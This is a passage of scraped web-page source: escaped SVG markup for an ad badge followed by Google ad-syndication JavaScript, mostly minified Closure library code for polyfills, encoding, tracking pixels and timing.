14.33Q32.51 14.33 32.73 14.00L32.73 14.00L32.73 14.00Q32.96 13.68 33.24 12.84L33.24 12.84L30.88 6.61L32.02 6.61L33.48 10.68L33.48 10.68Q33.61 11.06 33.76 11.65L33.76 11.65L33.78 11.65L33.78 11.65Q33.93 10.97 34.15 10.35L34.15 10.35L35.52 6.61ZM48.59 8.44L48.59 11.63L48.59 11.63Q46.96 12.97 45.04 12.97L45.04 12.97L45.04 12.97Q43.06 12.97 41.85 11.77L41.85 11.77L41.85 11.77Q40.64 10.56 40.64 8.57L40.64 8.57L40.64 8.57Q40.64 7.35 41.14 6.30L41.14 6.30L41.14 6.30Q41.63 5.24 42.59 4.67L42.59 4.67L42.59 4.67Q43.56 4.09 44.95 4.09L44.95 4.09L44.95 4.09Q46.40 4.09 47.28 4.73L47.28 4.73L47.28 4.73Q48.15 5.36 48.46 6.63L48.46 6.63L47.44 6.92L47.44 6.92Q47.20 5.99 46.58 5.53L46.58 5.53L46.58 5.53Q45.96 5.06 44.95 5.06L44.95 5.06L44.95 5.06Q43.40 5.06 42.61 6.01L42.61 6.01L42.61 6.01Q41.82 6.96 41.82 8.50L41.82 8.50L41.82 8.50Q41.82 9.64 42.20 10.41L42.20 10.41L42.20 10.41Q42.59 11.17 43.34 11.56L43.34 11.56L43.34 11.56Q44.09 11.95 44.98 11.95L44.98 11.95L44.98 11.95Q46.32 11.95 47.48 11.06L47.48 11.06L47.48 9.47L44.95 9.47L44.95 8.44L48.59 8.44ZM52.69 6.47L52.69 6.47L52.69 6.47Q53.95 6.47 54.78 7.29L54.78 7.29L54.78 7.29Q55.61 8.11 55.61 9.62L55.61 9.62L55.61 9.62Q55.61 11.46 54.71 12.21L54.71 12.21L54.71 12.21Q53.81 12.97 52.69 12.97L52.69 12.97L52.69 12.97Q51.51 12.97 50.64 12.19L50.64 12.19L50.64 12.19Q49.78 11.41 49.78 9.72L49.78 9.72L49.78 9.72Q49.78 8.08 50.61 7.27L50.61 7.27L50.61 7.27Q51.45 6.47 52.69 6.47ZM52.69 12.11L52.69 12.11L52.69 12.11Q53.59 12.11 54.06 11.44L54.06 11.44L54.06 11.44Q54.53 10.77 54.53 9.68L54.53 9.68L54.53 9.68Q54.53 8.51 54.00 7.92L54.00 7.92L54.00 7.92Q53.47 7.33 52.69 7.33L52.69 7.33L52.69 7.33Q51.88 7.33 51.37 7.93L51.37 7.93L51.37 7.93Q50.85 8.53 50.85 9.72L50.85 9.72L50.85 9.72Q50.85 10.90 51.38 11.50L51.38 11.50L51.38 11.50Q51.90 12.11 52.69 12.11ZM59.36 6.47L59.36 6.47L59.36 6.47Q60.62 6.47 61.45 7.29L61.45 7.29L61.45 7.29Q62.28 8.11 62.28 9.62L62.28 9.62L62.28 9.62Q62.28 11.46 61.38 12.21L61.38 12.21L61.38 12.21Q60.49 12.97 59.36 12.97L59.36 12.97L59.36 12.97Q58.18 12.97 57.32 12.19L57.32 12.19L57.32 12.19Q56.45 11.41 56.45 9.72L56.45 9.72L56.45 9.72Q56.45 8.08 57.29 7.27L57.29 7.27L57.29 7.27Q58.13 6.47 59.36 6.47ZM59.36 12.11L59.36 12.11L59.36 12.11Q60.26 12.11 60.73 11.44L60.73 11.44L60.73 11.44Q61.20 10.77 61.20 9.68L61.20 9.68L61.20 9.68Q61.20 8.51 60.67 7.92L60.67 7.92L60.67 7.92Q60.14 7.33 59.36 7.33L59.36 7.33L59.36 7.33Q58.56 7.33 58.04 7.93L58.04 7.93L58.04 7.93Q57.53 8.53 57.53 9.72L57.53 9.72L57.53 9.72Q57.53 10.90 58.05 11.50L58.05 11.50L58.05 11.50Q58.58 12.11 59.36 12.11ZM68.60 6.61L68.60 11.99L68.60 11.99Q68.60 13.31 68.33 13.97L68.33 13.97L68.33 13.97Q68.07 14.62 67.39 14.98L67.39 14.98L67.39 14.98Q66.72 15.35 65.78 15.35L65.78 15.35L65.78 15.35Q64.73 15.35 64.03 14.88L64.03 14.88L64.03 14.88Q63.32 14.41 63.32 13.34L63.32 13.34L64.35 13.50L64.35 13.50Q64.41 13.99 64.76 14.24L64.76 14.24L64.76 14.24Q65.12 14.48 65.77 14.48L65.77 14.48L65.77 14.48Q66.59 14.48 66.97 14.15L66.97 14.15L66.97 14.15Q67.35 13.82 67.44 13.34L67.44 13.34L67.44 13.34Q67.52 12.86 67.52 12.01L67.52 12.01L67.52 12.01Q66.84 12.83 65.79 12.83L65.79 12.83L65.79 12.83Q64.58 12.83 63.85 11.93L63.85 11.93L63.85 11.93Q63.11 11.03 63.11 9.67L63.11 9.67L63.11 9.67Q63.11 8.30 63.83 7.38L63.83 7.38L63.83 7.38Q64.54 6.47 65.81 6.47L65.81 6.47L65.81 6.47Q66.91 6.47 67.60 7.35L67.60 7.35L67.62 7.35L67.62 6.61L68.60 6.61ZM65.89 11.96L65.89 11.96L65.89 11.96Q66.57 11.96 67.09 11.43L67.09 11.43L67.09 11.43Q67.61 10.89 67.61 9.63L67.61 9.63L67.61 9.63Q67.61 8.52 67.11 7.92L67.11 7.92L67.11 7.92Q66.62 7.33 65.88 7.33L65.88 7.33L65.88 7.33Q65.13 7.33 64.66 7.94L64.66 7.94L64.66 7.94Q64.19 8.55 64.19 9.61L64.19 9.61L64.19 9.61Q64.19 10.83 64.68 11.40L64.68 11.40L64.68 11.40Q65.18 11.96 65.89 11.96ZM71.23 4.24L71.23 12.83L70.18 12.83L70.18 4.24L71.23 4.24ZM78.25 9.98L78.25 9.98L73.59 9.98L73.59 9.98Q73.65 11.02 74.18 11.56L74.18 11.56L74.18 11.56Q74.70 12.11 75.49 12.11L75.49 12.11L75.49 12.11Q76.09 12.11 76.50 11.79L76.50 11.79L76.50 11.79Q76.91 11.47 77.13 10.82L77.13 10.82L78.21 10.96L78.21 10.96Q77.95 11.93 77.24 12.45L77.24 12.45L77.24 12.45Q76.54 12.97 75.49 12.97L75.49 12.97L75.49 12.97Q74.09 12.97 73.30 12.11L73.30 12.11L73.30 12.11Q72.51 11.26 72.51 9.77L72.51 9.77L72.51 9.77Q72.51 8.30 73.27 7.38L73.27 7.38L73.27 7.38Q74.04 6.47 75.43 6.47L75.43 6.47L75.43 6.47Q76.11 6.47 76.74 6.77L76.74 6.77L76.74 6.77Q77.37 7.07 77.81 7.78L77.81 7.78L77.81 7.78Q78.25 8.50 78.25 9.98ZM73.65 9.12L77.16 9.12L77.16 9.12Q77.10 8.17 76.57 7.75L76.57 7.75L76.57 7.75Q76.05 7.33 75.43 7.33L75.43 7.33L75.43 7.33Q74.68 7.33 74.20 7.83L74.20 7.83L74.20 7.83Q73.72 8.33 73.65 9.12L73.65 9.12Z\x22/\x3e\x3c/svg\x3e\x3c/div\x3e\x3cdiv class\x3d\x22il-icon\x22\x3e\x3csvg xmlns\x3d\x22http://www.w3.org/2000/svg\x22 xmlns:xlink\x3d\x22http://www.w3.org/1999/xlink\x22 viewBox\x3d\x220 0 15 15\x22\x3e\x3cpath d\x3d\x22M7.5,1.5a6,6,0,1,0,0,12a6,6,0,1,0,0,-12m0,1a5,5,0,1,1,0,10a5,5,0,1,1,0,-10ZM6.625,11l1.75,0l0,-4.5l-1.75,0ZM7.5,3.75a1,1,0,1,0,0,2a1,1,0,1,0,0,-2Z\x22\x3e\x3c/path\x3e\x3c/svg\x3e\x3c/div\x3e\x3c/div\x3e\x3c/a\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3cscript data-jc\x3d\x2260\x22 src\x3d\x22https://pagead2.googlesyndication.com/pagead/js/r20230816/r20110914/abg_lite.js\x22 async data-jc-version\x3d\x22r20230816\x22 data-jcp-attribution-data\x3d\x22[null,null,null,0,null,0,0,1,0,0,0,1,0,0,0,null,0,null,0,null,null,null,null,0,null,null,0,null,null,\x26quot;right\x26quot;,0,0,\x26quot;r20230816/r20110914\x26quot;]\x22\x3e\x3c/script\x3e');
(function () {
  var script = document.createElement('script');
  script.text = `window.onerror = function(msg, url, line, col, error) {
      var extra = !col ? '' : '\\ncolumn: ' + col;
      extra += !error ? '' : '\\nerror: ' + error;
      console.log("Error: " + msg + "\\nurl: " + url + "\\nline: " + line + extra);
      var suppressErrorAlert = true;
      return suppressErrorAlert;
  };`;
  document.getElementsByTagName('head')[0].appendChild(script);
})();

// Save state to localStorage
document.write('\x3c/div\x3e');
function saveStateToLocalStorage() {
  localStorage.setItem('myGlobal', JSON.stringify(window.myGlobal));
}

// Save event to localStorage
if (!window.mraid) {
  document.write('\x3c/div\x3e');
}
(function () {
  (function () {
    var s = document.createElement('script');
    s.setAttribute('data-jc', '86');
    s.src = 'https://pagead2.googlesyndication.com/pagead/js/r20230816/r20110914/elements/html/omrhp.js';
    s.setAttribute('data-jc-version', 'r20230816');
    var ss = document.getElementsByTagName('script')[0];
    if (ss && ss.parentNode) {
      ss.parentNode.insertBefore(s, ss);
    }
  })();
  window.dicnf = {
    eavp: true,
    ebrp: true,
    apfa: true,
    atsb: true,
    bvst: 'r20230816',
    eeid: 'vM_gZNyxL4za2ATvvpAg',
    aunb: true,
    adsg: '',
    uffp: true
  };
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */function aa(a) {
      var b = 0;
      return function () {
        return b < a.length ? {
          done: !1,
          value: a[b++]
        } : {
          done: !0
        };
      };
    }
    var ba = "function" == typeof Object.defineProperties ? Object.defineProperty : function (a, b, c) {
      if (a == Array.prototype || a == Object.prototype) return a;
      a[b] = c.value;
      return a;
    };
    function ca(a) {
      a = ["object" == typeof globalThis && globalThis, a, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
      for (var b = 0; b < a.length; ++b) {
        var c = a[b];
        if (c && c.Math == Math) return c;
      }
      throw Error("Cannot find global object");
    }
    var da = ca(this);
    function m(a, b) {
      if (b) a: {
        var c = da;
        a = a.split(".");
        for (var d = 0; d < a.length - 1; d++) {
          var e = a[d];
          if (!(e in c)) break a;
          c = c[e];
        }
        a = a[a.length - 1];
        d = c[a];
        b = b(d);
        b != d && null != b && ba(c, a, {
          configurable: !0,
          writable: !0,
          value: b
        });
      }
    }
    function ea(a) {
      var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return {
        next: aa(a)
      };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    }
    var fa = "function" == typeof Object.assign ? Object.assign : function (a, b) {
      for (var c = 1; c < arguments.length; c++) {
        var d = arguments[c];
        if (d) for (var e in d) Object.prototype.hasOwnProperty.call(d, e) && (a[e] = d[e]);
      }
      return a;
    };
    m("Object.assign", function (a) {
      return a || fa;
    });
    var ha = "function" == typeof Object.create ? Object.create : function (a) {
        function b() {}
        b.prototype = a;
        return new b();
      },
      ia;
    if ("function" == typeof Object.setPrototypeOf) ia = Object.setPrototypeOf;else {
      var la;
      a: {
        var ma = {
            a: !0
          },
          na = {};
        try {
          na.__proto__ = ma;
          la = na.a;
          break a;
        } catch (a) {}
        la = !1;
      }
      ia = la ? function (a, b) {
        a.__proto__ = b;
        if (a.__proto__ !== b) throw new TypeError(a + " is not extensible");
        return a;
      } : null;
    }
    var oa = ia;
    function u(a, b) {
      a.prototype = ha(b.prototype);
      a.prototype.constructor = a;
      if (oa) oa(a, b);else for (var c in b) if ("prototype" != c) if (Object.defineProperties) {
        var d = Object.getOwnPropertyDescriptor(b, c);
        d && Object.defineProperty(a, c, d);
      } else a[c] = b[c];
      a.ba = b.prototype;
    }
    function pa() {
      for (var a = Number(this), b = [], c = a; c < arguments.length; c++) b[c - a] = arguments[c];
      return b;
    }
    m("Object.is", function (a) {
      return a ? a : function (b, c) {
        return b === c ? 0 !== b || 1 / b === 1 / c : b !== b && c !== c;
      };
    });
    m("Array.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        var d = this;
        d instanceof String && (d = String(d));
        var e = d.length;
        c = c || 0;
        for (0 > c && (c = Math.max(c + e, 0)); c < e; c++) {
          var f = d[c];
          if (f === b || Object.is(f, b)) return !0;
        }
        return !1;
      };
    });
    m("String.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        if (null == this) throw new TypeError("The 'this' value for String.prototype.includes must not be null or undefined");
        if (b instanceof RegExp) throw new TypeError("First argument to String.prototype.includes must not be a regular expression");
        return -1 !== this.indexOf(b, c || 0);
      };
    });
    m("globalThis", function (a) {
      return a || da;
    });
    var x = this || self;
    var qa, z;
    a: {
      for (var ra = ["CLOSURE_FLAGS"], A = x, sa = 0; sa < ra.length; sa++) if (A = A[ra[sa]], null == A) {
        z = null;
        break a;
      }
      z = A;
    }
    var ta = z && z[610401301];
    qa = null != ta ? ta : !1;
    var B,
      ua = x.navigator;
    B = ua ? ua.userAgentData || null : null;
    function va(a) {
      return qa ? B ? B.brands.some(function (b) {
        return (b = b.brand) && -1 != b.indexOf(a);
      }) : !1 : !1;
    }
    function E(a) {
      var b;
      a: {
        if (b = x.navigator) if (b = b.userAgent) break a;
        b = "";
      }
      return -1 != b.indexOf(a);
    }
    ;
    function F() {
      return qa ? !!B && 0 < B.brands.length : !1;
    }
    function wa() {
      return F() ? va("Chromium") : (E("Chrome") || E("CriOS")) && !(F() ? 0 : E("Edge")) || E("Silk");
    }
    ;
    var xa = Array.prototype.indexOf ? function (a, b) {
        return Array.prototype.indexOf.call(a, b, void 0);
      } : function (a, b) {
        if ("string" === typeof a) return "string" !== typeof b || 1 != b.length ? -1 : a.indexOf(b, 0);
        for (var c = 0; c < a.length; c++) if (c in a && a[c] === b) return c;
        return -1;
      },
      ya = Array.prototype.forEach ? function (a, b) {
        Array.prototype.forEach.call(a, b, void 0);
      } : function (a, b) {
        for (var c = a.length, d = "string" === typeof a ? a.split("") : a, e = 0; e < c; e++) e in d && b.call(void 0, d[e], e, a);
      };
    function za(a) {
      za[" "](a);
      return a;
    }
    za[" "] = function () {};
    var Aa = F() ? !1 : E("Trident") || E("MSIE");
    !E("Android") || wa();
    wa();
    E("Safari") && (wa() || (F() ? 0 : E("Coast")) || (F() ? 0 : E("Opera")) || (F() ? 0 : E("Edge")) || (F() ? va("Microsoft Edge") : E("Edg/")) || F() && va("Opera"));
    var Ba = {},
      G = null;
    function Ca(a, b) {
      void 0 === b && (b = 0);
      if (!G) {
        G = {};
        for (var c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), d = ["+/=", "+/", "-_=", "-_.", "-_"], e = 0; 5 > e; e++) {
          var f = c.concat(d[e].split(""));
          Ba[e] = f;
          for (var g = 0; g < f.length; g++) {
            var h = f[g];
            void 0 === G[h] && (G[h] = g);
          }
        }
      }
      b = Ba[b];
      c = Array(Math.floor(a.length / 3));
      d = b[64] || "";
      for (e = f = 0; f < a.length - 2; f += 3) {
        var k = a[f],
          l = a[f + 1];
        h = a[f + 2];
        g = b[k >> 2];
        k = b[(k & 3) << 4 | l >> 4];
        l = b[(l & 15) << 2 | h >> 6];
        h = b[h & 63];
        c[e++] = g + k + l + h;
      }
      g = 0;
      h = d;
      switch (a.length - f) {
        case 2:
          g = a[f + 1], h = b[(g & 15) << 2] || d;
        case 1:
          a = a[f], c[e] = b[a >> 2] + b[(a & 3) << 4 | g >> 4] + h + d;
      }
      return c.join("");
    }
    ;
    var Da = "undefined" !== typeof Uint8Array,
      Ea = !Aa && "function" === typeof btoa;
    var H = "function" === typeof Symbol && "symbol" === typeof Symbol() ? Symbol() : void 0,
      Fa = H ? function (a, b) {
        a[H] |= b;
      } : function (a, b) {
        void 0 !== a.g ? a.g |= b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ga(a) {
      var b = J(a);
      1 !== (b & 1) && (Object.isFrozen(a) && (a = Array.prototype.slice.call(a)), K(a, b | 1));
    }
    var J = H ? function (a) {
        return a[H] | 0;
      } : function (a) {
        return a.g | 0;
      },
      M = H ? function (a) {
        return a[H];
      } : function (a) {
        return a.g;
      },
      K = H ? function (a, b) {
        a[H] = b;
      } : function (a, b) {
        void 0 !== a.g ? a.g = b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ha() {
      var a = [];
      Fa(a, 1);
      return a;
    }
    function Ia(a) {
      a = a >> 11 & 1023;
      return 0 === a ? 536870912 : a;
    }
    ;
    var Ja = {};
    function N(a) {
      return null !== a && "object" === typeof a && !Array.isArray(a) && a.constructor === Object;
    }
    var Ka,
      O,
      La = [];
    K(La, 39);
    O = Object.freeze(La);
    function Ma(a) {
      if ("boolean" !== typeof a) {
        var b = typeof a;
        throw Error("Expected boolean but got " + ("object" != b ? b : a ? Array.isArray(a) ? "array" : b : "null") + ": " + a);
      }
      return !!a;
    }
    ;
    var Na;
    function P(a, b, c) {
      null == a && (a = Na);
      Na = void 0;
      if (null == a) {
        var d = 96;
        c ? (a = [c], d |= 512) : a = [];
        b && (d = d & -2095105 | (b & 1023) << 11);
      } else {
        if (!Array.isArray(a)) throw Error();
        d = J(a);
        if (d & 64) return a;
        d |= 64;
        if (c && (d |= 512, c !== a[0])) throw Error();
        a: {
          c = a;
          var e = c.length;
          if (e) {
            var f = e - 1,
              g = c[f];
            if (N(g)) {
              d |= 256;
              b = +!!(d & 512) - 1;
              e = f - b;
              1024 <= e && (Oa(c, b, g), e = 1023);
              d = d & -2095105 | (e & 1023) << 11;
              break a;
            }
          }
          b && (g = +!!(d & 512) - 1, b = Math.max(b, e - g), 1024 < b && (Oa(c, g, {}), d |= 256, b = 1023), d = d & -2095105 | (b & 1023) << 11);
        }
      }
      K(a, d);
      return a;
    }
    function Oa(a, b, c) {
      for (var d = 1023 + b, e = a.length, f = d; f < e; f++) {
        var g = a[f];
        null != g && g !== c && (c[f - b] = g);
      }
      a.length = d + 1;
      a[d] = c;
    }
    ;
    function Pa(a, b) {
      return Qa(b);
    }
    function Qa(a) {
      switch (typeof a) {
        case "number":
          return isFinite(a) ? a : String(a);
        case "boolean":
          return a ? 1 : 0;
        case "object":
          if (a && !Array.isArray(a) && Da && null != a && a instanceof Uint8Array) {
            if (Ea) {
              for (var b = "", c = 0, d = a.length - 10240; c < d;) b += String.fromCharCode.apply(null, a.subarray(c, c += 10240));
              b += String.fromCharCode.apply(null, c ? a.subarray(c) : a);
              a = btoa(b);
            } else a = Ca(a);
            return a;
          }
      }
      return a;
    }
    ;
    function Ra(a, b, c, d, e, f) {
      if (null != a) {
        if (Array.isArray(a)) a = e && 0 == a.length && J(a) & 1 ? void 0 : f && J(a) & 2 ? a : Sa(a, b, c, void 0 !== d, e, f);else if (N(a)) {
          var g = {},
            h;
          for (h in a) g[h] = Ra(a[h], b, c, d, e, f);
          a = g;
        } else a = b(a, d);
        return a;
      }
    }
    function Sa(a, b, c, d, e, f) {
      var g = d || c ? J(a) : 0;
      d = d ? !!(g & 32) : void 0;
      a = Array.prototype.slice.call(a);
      for (var h = 0; h < a.length; h++) a[h] = Ra(a[h], b, c, d, e, f);
      c && c(g, a);
      return a;
    }
    function Ta(a) {
      return a.Z === Ja ? a.toJSON() : Qa(a);
    }
    ;
    function Ua(a, b, c) {
      var d = a.l,
        e = M(d);
      if (e & 2) throw Error();
      Va(d, e, b, c);
      return a;
    }
    function Va(a, b, c, d) {
      var e = Ia(b);
      if (c >= e) {
        var f = b;
        if (b & 256) e = a[a.length - 1];else {
          if (null == d) return;
          e = a[e + (+!!(b & 512) - 1)] = {};
          f |= 256;
        }
        e[c] = d;
        f !== b && K(a, f);
      } else a[c + (+!!(b & 512) - 1)] = d, b & 256 && (a = a[a.length - 1], c in a && delete a[c]);
    }
    function Q(a, b, c) {
      if (null != c && "string" !== typeof c) throw Error();
      return Ua(a, b, c);
    }
    ;
    function R(a, b, c) {
      this.l = P(a, b, c);
    }
    R.prototype.toJSON = function () {
      if (Ka) var a = Wa(this, this.l, !1);else a = Sa(this.l, Ta, void 0, void 0, !1, !1), a = Wa(this, a, !0);
      return a;
    };
    function Xa(a) {
      Ka = !0;
      try {
        return JSON.stringify(a.toJSON(), Pa);
      } finally {
        Ka = !1;
      }
    }
    R.prototype.Z = Ja;
    R.prototype.toString = function () {
      return Wa(this, this.l, !1).toString();
    };
    function Wa(a, b, c) {
      var d = a.constructor.aa,
        e = Ia(M(c ? a.l : b)),
        f = !1;
      if (d) {
        if (!c) {
          b = Array.prototype.slice.call(b);
          var g;
          if (b.length && N(g = b[b.length - 1])) for (f = 0; f < d.length; f++) if (d[f] >= e) {
            Object.assign(b[b.length - 1] = {}, g);
            break;
          }
          f = !0;
        }
        e = b;
        c = !c;
        g = M(a.l);
        a = Ia(g);
        g = +!!(g & 512) - 1;
        for (var h, k, l = 0; l < d.length; l++) if (k = d[l], k < a) {
          k += g;
          var n = e[k];
          null == n ? e[k] = c ? O : Ha() : c && n !== O && Ga(n);
        } else h || (n = void 0, e.length && N(n = e[e.length - 1]) ? h = n : e.push(h = {})), n = h[k], null == h[k] ? h[k] = c ? O : Ha() : c && n !== O && Ga(n);
      }
      d = b.length;
      if (!d) return b;
      var p;
      if (N(h = b[d - 1])) {
        a: {
          var q = h;
          e = {};
          c = !1;
          for (var v in q) a = q[v], Array.isArray(a) && a != a && (c = !0), null != a ? e[v] = a : c = !0;
          if (c) {
            for (var t in e) {
              q = e;
              break a;
            }
            q = null;
          }
        }
        q != h && (p = !0);
        d--;
      }
      for (; 0 < d; d--) {
        h = b[d - 1];
        if (null != h) break;
        var y = !0;
      }
      if (!p && !y) return b;
      var w;
      f ? w = b : w = Array.prototype.slice.call(b, 0, d);
      b = w;
      f && (b.length = d);
      q && b.push(q);
      return b;
    }
    ;
    function Ya(a) {
      this.l = P(a);
    }
    u(Ya, R);
    function Za(a, b) {
      this.key = a;
      this.defaultValue = void 0 === b ? !1 : b;
      this.valueType = "boolean";
    }
    ;
    var $a = new Za("100000"),
      ab = new Za("45357156", !0),
      bb = new Za("45350890"),
      cb = new Za("45414892");
    var db = ["A7CQXglZzTrThjGTBEn1rWTxHOEtkWivwzgea+NjyardrwlieSjVuyG44PkYgIPGs8Q9svD8sF3Yedn0BBBjXAkAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="];
    function eb(a, b) {
      return "&adurl=" == a.substring(a.length - 7) ? a.substring(0, a.length - 7) + b + "&adurl=" : a + b;
    }
    ;
    function S(a) {
      return a = void 0 === a ? window : a;
    }
    ;
    var T = x.dicnf || {};
    function fb(a) {
      var b = !1,
        c;
      return function () {
        b || (c = a(), b = !0);
        return c;
      };
    }
    ;
    function gb(a, b, c) {
      a.addEventListener && a.addEventListener(b, c, !1);
    }
    function hb(a, b, c) {
      a.removeEventListener && a.removeEventListener(b, c, !1);
    }
    ;
    var ib = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");
    function jb(a, b, c, d) {
      for (var e = c.length; 0 <= (b = a.indexOf(c, b)) && b < d;) {
        var f = a.charCodeAt(b - 1);
        if (38 == f || 63 == f) if (f = a.charCodeAt(b + e), !f || 61 == f || 38 == f || 35 == f) return b;
        b += e + 1;
      }
      return -1;
    }
    var kb = /#|$/,
      lb = /[?&]($|#)/;
    function mb(a) {
      try {
        var b;
        if (b = !!a && null != a.location.href) a: {
          try {
            za(a.foo);
            b = !0;
            break a;
          } catch (c) {}
          b = !1;
        }
        return b;
      } catch (c) {
        return !1;
      }
    }
    function nb(a, b) {
      b = void 0 === b ? !1 : b;
      var c = void 0 === c ? x : c;
      for (var d = 0; c && 40 > d++ && (!b && !mb(c) || !a(c));) a: {
        try {
          var e = c.parent;
          if (e && e != c) {
            c = e;
            break a;
          }
        } catch (f) {}
        c = null;
      }
    }
    function ob() {
      if (!globalThis.crypto) return Math.random();
      try {
        var a = new Uint32Array(1);
        globalThis.crypto.getRandomValues(a);
        return a[0] / 65536 / 65536;
      } catch (b) {
        return Math.random();
      }
    }
    function pb(a, b) {
      if (a) for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
    }
    var qb = [];
    function rb() {
      var a = qb;
      qb = [];
      a = ea(a);
      for (var b = a.next(); !b.done; b = a.next()) {
        b = b.value;
        try {
          b();
        } catch (c) {}
      }
    }
    function sb(a, b) {
      "complete" === a.readyState || "interactive" === a.readyState ? (qb.push(b), 1 == qb.length && (window.Promise ? Promise.resolve().then(rb) : window.setImmediate ? setImmediate(rb) : setTimeout(rb, 0))) : a.addEventListener("DOMContentLoaded", b);
    }
    function tb(a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    }
    ;
    function U(a, b, c, d) {
      ub(x, a, void 0 === b ? null : b, !1, void 0 === c ? !1 : c, void 0 === d ? !1 : d);
    }
    function ub(a, b, c, d, e, f) {
      f = void 0 === f ? !1 : f;
      a.google_image_requests || (a.google_image_requests = []);
      var g = tb("IMG", a.document);
      if (c || e) {
        var h = function (k) {
          c && c(k);
          if (e) {
            k = a.google_image_requests;
            var l = xa(k, g);
            0 <= l && Array.prototype.splice.call(k, l, 1);
          }
          hb(g, "load", h);
          hb(g, "error", h);
        };
        gb(g, "load", h);
        gb(g, "error", h);
      }
      d && (g.referrerPolicy = "no-referrer");
      f && (g.attributionSrc = "");
      g.src = b;
      a.google_image_requests.push(g);
    }
    var vb = fb(function () {
      return "referrerPolicy" in tb("IMG");
    });
    function wb() {
      this.g = {};
    }
    function V(a) {
      xb || (xb = new yb());
      var b = xb.g[a.key];
      if ("proto" === a.valueType) {
        try {
          var c = JSON.parse(b);
          if (Array.isArray(c)) return c;
        } catch (d) {}
        return a.defaultValue;
      }
      return typeof b === typeof a.defaultValue ? b : a.defaultValue;
    }
    ;
    function yb() {
      this.g = {};
      var a = document.currentScript;
      a = (a = (a = void 0 === a ? null : a) && "0" === a.getAttribute("data-jc") ? a : document.querySelector('[data-jc="0"]')) && a.getAttribute("data-jc-flags") || "";
      try {
        var b = JSON.parse(a)[0];
        a = "";
        for (var c = 0; c < b.length; c++) a += String.fromCharCode(b.charCodeAt(c) ^ "\u0003\u0007\u0003\u0007\b\u0004\u0004\u0006\u0005\u0003".charCodeAt(c % 10));
        this.g = JSON.parse(a);
      } catch (d) {}
    }
    var xb;
    u(yb, wb);
    function zb(a, b) {
      var c = void 0 === c ? {} : c;
      this.error = a;
      this.context = b.context;
      this.msg = b.message || "";
      this.id = b.id || "jserror";
      this.meta = c;
    }
    ;
    var Bb = RegExp("^https?://(\\w|-)+\\.cdn\\.ampproject\\.(net|org)(\\?|/|$)");
    function Cb(a, b) {
      this.g = a;
      this.h = b;
    }
    function Db(a, b) {
      this.url = a;
      this.R = !!b;
      this.depth = null;
    }
    ;
    var Eb = null;
    function Fb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now && a.timing ? Math.floor(a.now() + a.timing.navigationStart) : Date.now();
    }
    function Gb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now ? a.now() : null;
    }
    ;
    function Hb(a, b) {
      var c = Gb() || Fb();
      this.label = a;
      this.type = b;
      this.value = c;
      this.duration = 0;
      this.taskId = this.slotId = void 0;
      this.uniqueId = Math.random();
    }
    ;
    var W = x.performance,
      Ib = !!(W && W.mark && W.measure && W.clearMarks),
      X = fb(function () {
        var a;
        if (a = Ib) {
          var b;
          if (null === Eb) {
            Eb = "";
            try {
              a = "";
              try {
                a = x.top.location.hash;
              } catch (c) {
                a = x.location.hash;
              }
              a && (Eb = (b = a.match(/\bdeid=([\d,]+)/)) ? b[1] : "");
            } catch (c) {}
          }
          b = Eb;
          a = !!b.indexOf && 0 <= b.indexOf("1337");
        }
        return a;
      });
    function Jb() {
      var a = window;
      this.h = [];
      this.i = a || x;
      var b = null;
      a && (a.google_js_reporting_queue = a.google_js_reporting_queue || [], this.h = a.google_js_reporting_queue, b = a.google_measure_js_timing);
      this.g = X() || (null != b ? b : 1 > Math.random());
    }
    function Kb(a) {
      a && W && X() && (W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_start"), W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_end"));
    }
    Jb.prototype.start = function (a, b) {
      if (!this.g) return null;
      a = new Hb(a, b);
      b = "goog_" + a.label + "_" + a.uniqueId + "_start";
      W && X() && W.mark(b);
      return a;
    };
    Jb.prototype.end = function (a) {
      if (this.g && "number" === typeof a.value) {
        a.duration = (Gb() || Fb()) - a.value;
        var b = "goog_" + a.label + "_" + a.uniqueId + "_end";
        W && X() && W.mark(b);
        !this.g || 2048 < this.h.length || this.h.push(a);
      }
    };
    function Lb() {
      this.i = "&";
      this.h = {};
      this.j = 0;
      this.g = [];
    }
    function Mb(a, b) {
      var c = {};
      c[a] = b;
      return [c];
    }
    function Nb(a, b, c, d, e) {
      var f = [];
      pb(a, function (g, h) {
        (g = Ob(g, b, c, d, e)) && f.push(h + "=" + g);
      });
      return f.join(b);
    }
    function Ob(a, b, c, d, e) {
      if (null == a) return "";
      b = b || "&";
      c = c || ",$";
      "string" == typeof c && (c = c.split(""));
      if (a instanceof Array) {
        if (d = d || 0, d < c.length) {
          for (var f = [], g = 0; g < a.length; g++) f.push(Ob(a[g], b, c, d + 1, e));
          return f.join(c[d]);
        }
      } else if ("object" == typeof a) return e = e || 0, 2 > e ? encodeURIComponent(Nb(a, b, c, d, e + 1)) : "...";
